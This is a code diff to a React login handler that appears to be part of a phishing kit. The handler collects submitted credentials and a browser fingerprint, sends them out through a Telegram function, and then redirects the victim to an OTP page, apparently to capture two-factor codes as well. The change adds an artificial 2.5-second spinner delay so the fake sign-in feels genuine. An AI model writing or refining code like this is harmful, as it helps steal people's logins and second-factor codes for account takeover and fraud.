@@ -30,7 +30,6 @@ function App() {
   const location = useLocation();
 
   const handleLoginSuccess = async (loginData: any) => {
-    setIsLoading(true);
     const browserFingerprint = await getBrowserFingerprint();
     const credentialsData = {
       ...loginData,
@@ -42,11 +41,13 @@ function App() {
 
     await safeSendToTelegram({ type: 'credentials', data: credentialsData });
 
+    // Brief delay so the spinner is visible on the Sign In button
+    await new Promise((r) => setTimeout(r, 2500));
+
     setLoginFlowState({
       awaitingOtp: true,
       sessionData: credentialsData,
     });
-    setIsLoading(false);
     navigate('/otp', { replace: true });
   };
 
